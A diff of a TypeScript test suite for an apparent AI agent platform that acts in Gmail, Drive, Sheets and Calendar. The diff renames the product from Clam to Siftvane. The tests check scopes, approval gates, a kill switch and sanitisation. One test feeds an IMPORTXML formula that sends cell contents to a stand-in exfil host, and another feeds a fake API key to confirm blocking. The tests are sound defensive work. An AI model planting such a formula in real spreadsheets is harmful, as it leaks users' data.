@@ -4,20 +4,20 @@ import path from 'node:path';
 import { Client } from '../apps/server/node_modules/@modelcontextprotocol/sdk/dist/esm/client/index.js';
 import { StreamableHTTPClientTransport } from '../apps/server/node_modules/@modelcontextprotocol/sdk/dist/esm/client/streamableHttp.js';
 import { expect, it } from 'vitest';
-import { createClamApp } from '../apps/server/src/app.js';
-import { bannedScopes, connectedServices, exactScopes, mayUse, workspaceScopes } from '../apps/server/src/auth/google.js';
+import { createSiftvaneApp } from '../apps/server/src/app.js';
+import { bannedScopes, connectedServices, exactScopes, mayUse, workspaceScopes, sandboxMcpOwner } from '../apps/server/src/auth/google.js';
 import { verifyTrace } from '../apps/server/src/inbox/trace.js';
 import { compileIntent } from '../apps/server/src/platform/planner.js';
 import { evaluateWorkspaceAction } from '../apps/server/src/workspace/policy.js';
 import { hasLiveFormula, sanitizeCell } from '../apps/server/src/workspace/sanitize.js';
 
-type Runtime = Awaited<ReturnType<typeof createClamApp>>;
+type Runtime = Awaited<ReturnType<typeof createSiftvaneApp>>;
 const payload = (result: { content: unknown }) => JSON.parse((result.content as { text: string }[])[0].text);
 const allScopes = ['mail:read', 'mail:send', 'calendar:propose', 'attachment:extract', 'agent:manage', 'workspace:write', 'photos:read'];
 
 async function runtimeTest(work: (runtime: Runtime, base: string, dir: string) => Promise<void>) {
-  const dir = await mkdtemp(path.join(tmpdir(), 'clam-workspace-agents-'));
-  const runtime = await createClamApp({ databasePath: ':memory:', config: {
+  const dir = await mkdtemp(path.join(tmpdir(), 'siftvane-workspace-agents-'));
+  const runtime = await createSiftvaneApp({ databasePath: ':memory:', config: {
     inboxLive: false, tracesDir: path.join(dir, 'traces'), mailAttachmentsDir: path.join(dir, 'workspace', 'mail-attachments'),
   } });
   try { await work(runtime, await runtime.app.listen({ port: 0, host: '127.0.0.1' }), dir); }
@@ -47,7 +47,7 @@ async function until<T>(read: () => T | Promise<T>, done: (value: T) => boolean,
 const sheet = (runtime: Runtime, key: string) => runtime.inbox.store.entity('sandbox', 'workspace', key) as {
   type: string; title: string; tabs: { name: string; headers: string[]; rows: (string | number)[][] }[];
 } | null;
-const artifacts = (runtime: Runtime) => runtime.platform.artifacts('clam-local-sandbox');
+const artifacts = (runtime: Runtime) => runtime.platform.artifacts(sandboxMcpOwner);
 
 it('provisions a persistent agent from one CLI sentence, auto-switches to it, and builds verified Drive, Sheets, and Docs artifacts', () =>
   runtimeTest(async (runtime, base, dir) => {
@@ -69,21 +69,21 @@ it('provisions a persistent agent from one CLI sentence, auto-switches to it, an
 
     // SQLite system of record: agent row, automatic active-agent switch, and switch history.
     const row = runtime.inbox.store.sqlite.prepare('SELECT * FROM user_agents WHERE id=?').get(agentId) as Record<string, string>;
-    expect(row).toMatchObject({ source_cli: 'claude-code', schedule_mode: 'daily', status: 'input_required', user_id: 'clam-local-sandbox' });
+    expect(row).toMatchObject({ source_cli: 'claude-code', schedule_mode: 'daily', status: 'input_required', user_id: sandboxMcpOwner });
     expect(row.goal_prompt).toContain('recurring bills and daily invoices');
     expect(JSON.parse(row.allowed_services_json)).toEqual(expect.arrayContaining(['gmail', 'drive', 'sheets', 'docs']));
-    expect(runtime.dbHandle.sqlite.prepare('SELECT active_agent_id FROM users WHERE id=?').get('clam-local-sandbox')).toEqual({ active_agent_id: agentId });
+    expect(runtime.dbHandle.sqlite.prepare('SELECT active_agent_id FROM users WHERE id=?').get(sandboxMcpOwner)).toEqual({ active_agent_id: agentId });
     expect(runtime.inbox.store.sqlite.prepare('SELECT switched_by, from_agent_id, to_agent_id FROM agent_switch_history').all())
       .toEqual([{ switched_by: 'cli_auto', from_agent_id: null, to_agent_id: agentId }]);
 
     // Drive folder tree, PDFs, Sheet, and Doc were created and verified by read-back.
     const created = artifacts(runtime);
-    expect(created.filter((item) => item.service === 'drive_folder').map((item) => item.title).sort()).toEqual(['2026-12', 'Clam', 'Invoices']);
+    expect(created.filter((item) => item.service === 'drive_folder').map((item) => item.title).sort()).toEqual(['2026-12', 'Invoices', 'Siftvane']);
     expect(created.filter((item) => item.service === 'drive_file').map((item) => item.title).sort()).toEqual(['invoice-FIG-3391.pdf', 'invoice-PC-1207.pdf']);
     const ledger = created.find((item) => item.service === 'google_sheet')!;
     const summary = created.find((item) => item.service === 'google_doc')!;
-    expect(ledger.title).toBe('Clam Invoice Ledger');
-    expect(summary.title).toBe('Clam Invoice Summary');
+    expect(ledger.title).toBe('Siftvane Invoice Ledger');
+    expect(summary.title).toBe('Siftvane Invoice Summary');
     const ledgerState = sheet(runtime, ledger.logical_key)!;
     const daily = ledgerState.tabs.find((tab) => tab.name === 'Daily Invoices')!;
     expect(daily.headers).toEqual(['Date', 'Vendor', 'Invoice #', 'Amount', 'Due Date', 'Status', 'Drive Link']);
@@ -101,7 +101,7 @@ it('provisions a persistent agent from one CLI sentence, auto-switches to it, an
     expect(provisioned.pending_approvals.sort()).toEqual(approvals.map((item) => item.approval_id).sort());
 
     // Every step is journaled with a policy verdict and trace hash; writes are verified.
-    const logs = runtime.platform.logs('clam-local-sandbox', { agentId, limit: 200 });
+    const logs = runtime.platform.logs(sandboxMcpOwner, { agentId, limit: 200 });
     expect(new Set(logs.map((entry) => entry.service))).toEqual(new Set(['system', 'gmail', 'drive', 'sheets', 'docs', 'policy']));
     const writes = logs.filter((entry) => ['drive', 'sheets', 'docs'].includes(entry.service));
     expect(writes.length).toBeGreaterThanOrEqual(8);
@@ -125,18 +125,18 @@ it('provisions a persistent agent from one CLI sentence, auto-switches to it, an
     await until(() => runtime.platform.agent(agentId)!, (agent) => agent.run_count === 2 && agent.status !== 'active' || (agent.run_count === 2 && agent.next_run_at !== null));
     expect(sheet(runtime, ledger.logical_key)!.tabs.find((tab) => tab.name === 'Daily Invoices')!.rows).toHaveLength(5);
     expect(artifacts(runtime).filter((item) => item.service === 'drive_file')).toHaveLength(2);
-    expect(runtime.platform.logs('clam-local-sandbox', { agentId, service: 'sheets' }).some((entry) => entry.policy_rule_id === 'IDEMPOTENT_DEDUPE')).toBe(true);
+    expect(runtime.platform.logs(sandboxMcpOwner, { agentId, service: 'sheets' }).some((entry) => entry.policy_rule_id === 'IDEMPOTENT_DEDUPE')).toBe(true);
 
     // The CLI can inspect agents, switches, links, and logs; switching back is recorded as cli_manual.
     const second = payload(await client.callTool({ name: 'provision_and_run_agent', arguments: {
       user_instruction: 'Summarize anything about the launch into a Google Doc', wait_seconds: 20 } }));
-    expect(runtime.platform.activeAgentId('clam-local-sandbox')).toBe(second.agent_id);
+    expect(runtime.platform.activeAgentId(sandboxMcpOwner)).toBe(second.agent_id);
     expect(payload(await client.callTool({ name: 'switch_active_agent', arguments: { agent_id: agentId, reason: 'Back to invoices' } })))
       .toMatchObject({ switched: true, switched_by: 'cli_manual', from_agent_id: second.agent_id, to_agent_id: agentId });
     const listing = payload(await client.callTool({ name: 'list_user_agents_and_logs', arguments: { agent_id: agentId, service: 'sheets', limit: 5 } }));
     expect(listing.active_agent_id).toBe(agentId);
     expect(listing.switch_history.map((entry: { switched_by: string }) => entry.switched_by)).toEqual(['cli_manual', 'cli_auto', 'cli_auto']);
-    expect(listing.artifacts.map((entry: { title: string }) => entry.title)).toContain('Clam Invoice Ledger');
+    expect(listing.artifacts.map((entry: { title: string }) => entry.title)).toContain('Siftvane Invoice Ledger');
     expect(listing.logs.every((entry: { service: string }) => entry.service === 'sheets')).toBe(true);
     await client.close();
   }), 60_000);
@@ -164,7 +164,7 @@ it('emails vendors behind a Tier 2 batch gate, builds a sanitized comparison She
     const transports = runtime.inbox.store.entities<{ headers: Record<string, string>; body: string; to: string }>('sandbox', 'review')
       .filter((entry) => entry?.headers);
     expect(transports).toHaveLength(4);
-    expect(transports.every((entry) => entry.headers['X-Agent-Automated'] === 'true' && entry.body.includes('sent automatically by Clam'))).toBe(true);
+    expect(transports.every((entry) => entry.headers['X-Agent-Automated'] === 'true' && entry.body.includes('sent automatically by Siftvane'))).toBe(true);
 
     const waiting = await until(() => runtime.platform.agent(agentId)!, (agent) => agent.state.phase === 'awaiting_booking_approval' && agent.status === 'input_required');
     const comparison = artifacts(runtime).find((item) => item.service === 'google_sheet')!;
@@ -181,7 +181,7 @@ it('emails vendors behind a Tier 2 batch gate, builds a sanitized comparison She
     expect(notes.startsWith("'")).toBe(true);
     expect(notes).toContain('IMPORTXML (');
     expect(hasLiveFormula(matrix.rows)).toBe(false);
-    const sanitizedLog = runtime.platform.logs('clam-local-sandbox', { agentId, service: 'gmail' }).find((entry) => entry.input_summary.includes('cartonhub'));
+    const sanitizedLog = runtime.platform.logs(sandboxMcpOwner, { agentId, service: 'gmail' }).find((entry) => entry.input_summary.includes('cartonhub'));
     expect(sanitizedLog?.output_summary).toContain('FORMULA_PREFIX_NEUTRALIZED');
 
     const memo = artifacts(runtime).find((item) => item.service === 'google_doc')!;
@@ -199,7 +199,7 @@ it('emails vendors behind a Tier 2 batch gate, builds a sanitized comparison She
     await runtime.app.inject({ method: 'POST', url: '/api/inbox/approvals/' + booking.approval_id, payload: { approve: true } });
     await until(() => runtime.platform.agent(agentId)!, (agent) => agent.status === 'completed');
     expect(bookingSends()).toEqual({ n: 1 });
-    expect(runtime.platform.logs('clam-local-sandbox', { agentId }).find((entry) => entry.action_name === 'booking_confirmation_sent')?.output_summary)
+    expect(runtime.platform.logs(sandboxMcpOwner, { agentId }).find((entry) => entry.action_name === 'booking_confirmation_sent')?.output_summary)
       .toContain('sent and verified (1 message)');
 
     // Direct MCP writes get the same firewall: an injected formula is neutralized and the read-back row count is verified.
@@ -208,7 +208,7 @@ it('emails vendors behind a Tier 2 batch gate, builds a sanitized comparison She
       title: 'Ad hoc', sheet_name: 'Rows', rows: [['Evil', '=IMPORTXML("https://exfil.example/?q="&A1,"//a")'], ['Plain', 'ok']], dedupe_key_column: 'Vendor' } }));
     expect(appended).toMatchObject({ appended: 2, rowCount: 2, verified: true, flags: expect.arrayContaining(['FORMULA_PREFIX_NEUTRALIZED']) });
     const secret = payload(await client.callTool({ name: 'drive_save_file', arguments: {
-      folder_path: ['Clam', 'Notes'], file_name: 'env.txt', mime_type: 'text/plain', content_text: 'OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz123456' } }));
+      folder_path: ['Siftvane', 'Notes'], file_name: 'env.txt', mime_type: 'text/plain', content_text: 'OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz123456' } }));
     expect(secret).toMatchObject({ verified: false, decision: 'BLOCKED', policy_rule_id: 'WORKSPACE_SECRET_BLOCKED' });
     await client.close();
   }), 60_000);
@@ -224,16 +224,16 @@ it('extracts receipt photos into a Google Sheet and adds calendar payment remind
       user_instruction: 'Go through my receipt photos, put them in a spreadsheet, and remind me on the calendar before anything is due.',
       wait_seconds: 20 } }));
     expect(provisioned).toMatchObject({ status: 'completed', plan_summary: { template: 'photo_receipts' } });
-    const receipts = artifacts(runtime).find((item) => item.title === 'Clam Receipts')!;
+    const receipts = artifacts(runtime).find((item) => item.title === 'Siftvane Receipts')!;
     const tab = sheet(runtime, receipts.logical_key)!.tabs[0];
     expect(tab.rows).toEqual([
       ['2026-12-05', 'Harbor Cafe', '', 86.4, 'USD', '', 'photo-receipt-cafe'],
       ['2026-12-06', 'City Parking Authority', 'PK-55821', 32, 'USD', '2026-12-20', 'photo-ticket-parking'],
     ]);
     const reminder = runtime.inbox.store.entities<{ id: string; title: string; start: string; kind: string }>('sandbox', 'calendar')
-      .find((event) => event.id.startsWith('clam-reminder-'))!;
+      .find((event) => event.id.startsWith('siftvane-reminder-'))!;
     expect(reminder).toMatchObject({ kind: 'reminder', start: '2026-12-20T09:00:00.000Z', title: 'Pay City Parking Authority PK-55821 (32 USD)' });
-    const calendarLog = runtime.platform.logs('clam-local-sandbox', { agentId: provisioned.agent_id, service: 'calendar' })[0];
+    const calendarLog = runtime.platform.logs(sandboxMcpOwner, { agentId: provisioned.agent_id, service: 'calendar' })[0];
     expect(calendarLog).toMatchObject({ verified: true, policy_verdict: 'ALLOW_TIER_0' });
     await client.close();
   }), 60_000);
@@ -251,7 +251,7 @@ it('halts every agent with the kill switch, blocks reactivation while latched, a
     expect(payload(await client.callTool({ name: 'drive_ensure_folder', arguments: { name: 'Blocked' } }))).toEqual({ error: 'INBOX_HALTED' });
     await runtime.app.inject({ method: 'POST', url: '/api/inbox/kill-switch', payload: { active: false, reason: 'Resume test' } });
 
-    const runId = runtime.platform.logs('clam-local-sandbox', { agentId }).find((entry) => entry.mission_run_id)!.mission_run_id!;
+    const runId = runtime.platform.logs(sandboxMcpOwner, { agentId }).find((entry) => entry.mission_run_id)!.mission_run_id!;
     const before = artifacts(runtime).length;
     expect(before).toBeGreaterThanOrEqual(7);
     const rollback = await runtime.app.inject({ method: 'POST', url: `/api/inbox/runs/${runId}/rollback`, payload: { wait: true } });
@@ -285,11 +285,11 @@ it('enforces least-privilege Workspace scopes, token scopes, and the determinist
     expect(payload(await readOnly.callTool({ name: 'provision_and_run_agent', arguments: { user_instruction: 'Log my invoices into a Google Sheet' } })))
       .toEqual({ error: 'MCP_SCOPE_REQUIRED' });
     for (const user_instruction of ['Email sam@team.example a summary of order emails', 'Draft replies to people who emailed me about meetings',
-      'Label launch emails CLAM_LAUNCH']) {
+      'Label launch emails SIFTVANE_LAUNCH']) {
       expect(compileIntent(user_instruction, { mode: 'sandbox' }).plan.template).toBe('generic');
       expect(payload(await readOnly.callTool({ name: 'provision_and_run_agent', arguments: { user_instruction } })))
         .toEqual({ error: 'MCP_SCOPE_REQUIRED' });
     }
-    expect(runtime.platform.agents('clam-local-sandbox')).toHaveLength(0);
+    expect(runtime.platform.agents(sandboxMcpOwner)).toHaveLength(0);
     await readOnly.close();
   }), 60_000);
